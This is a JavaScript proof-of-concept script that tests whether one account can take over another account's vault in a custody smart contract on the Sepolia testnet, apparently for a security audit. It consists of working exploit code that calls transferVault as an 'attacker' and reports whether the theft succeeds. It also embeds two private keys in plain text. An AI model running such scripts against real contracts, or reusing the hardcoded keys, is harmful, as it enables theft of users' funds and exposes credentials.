const { ethers } = require("ethers");

// === TEST: CROSS-ACCOUNT VAULT THEFT ===
// Victim creates vault, Attacker tries to steal it

const RPC_URL = "https://ethereum-sepolia.publicnode.com";
const CUSTODY_ADDRESS = "0x815aeca64a974297942d2bbf034bd63eb638883d";

const VICTIM_PK = "0xa12f4dc456a8fa989f093604e702384f9691f99c3242f615fc9a1ba0d3b3eaf2";
const ATTACKER_PK = "0x66703806999048d288011123372530e7e54a85f56cb80397a59c5d6e2911c3a4";

const ABI = [
    "function createVault(bytes32 _creator) external",
    "function transferVault(bytes32 _creator, address _transferee) external"
];

async function run() {
    console.log("=== VAULT THEFT TEST (Cross-Account) ===\n");

    const provider = new ethers.providers.JsonRpcProvider(RPC_URL);
    const victim = new ethers.Wallet(VICTIM_PK, provider);
    const attacker = new ethers.Wallet(ATTACKER_PK, provider);

    const victimContract = new ethers.Contract(CUSTODY_ADDRESS, ABI, victim);
    const attackerContract = new ethers.Contract(CUSTODY_ADDRESS, ABI, attacker);

    console.log("SETUP:");
    console.log("=".repeat(70));
    console.log(`Victim:   ${victim.address}`);
    console.log(`Attacker: ${attacker.address}`);
    console.log("=".repeat(70));

    // Step 1: Victim creates vault
    const vaultId = ethers.utils.formatBytes32String("VictimVault" + Date.now());
    console.log(`\n[STEP 1] Victim creates vault: ${vaultId.substring(0, 20)}...`);

    try {
        const tx1 = await victimContract.createVault(vaultId, { gasLimit: 500000 });
        const r1 = await tx1.wait();
        console.log(`Vault created by victim.`);
        console.log(`Transaction: ${r1.transactionHash}\n`);
    } catch (e) {
        console.log("Vault creation failed:", e.message);
        return;
    }

    // Step 2: Attacker tries to steal the vault
    console.log("Step 2: Attacker attempting to steal vault...");
    console.log(`Transferring to: ${attacker.address}\n`);

    try {
        const tx2 = await attackerContract.transferVault(vaultId, attacker.address, { gasLimit: 500000 });
        const r2 = await tx2.wait();

        console.log("CRITICAL VULNERABILITY CONFIRMED.");
        console.log("=".repeat(70));
        console.log("ATTACKER SUCCESSFULLY STOLE THE VAULT");
        console.log("=".repeat(70));
        console.log(`Theft Transaction: ${r2.transactionHash}`);
        console.log(`Block Number:      ${r2.blockNumber}`);
        console.log("\nImpact: Any user can steal any other user's vault.");
        console.log("Severity: Critical - Direct theft of custody.\n");

    } catch (e) {
        console.log("Protected: Transfer blocked by contract.");
        console.log(`Reason: ${e.reason || e.message}\n`);
    }
}

run().catch(console.error);
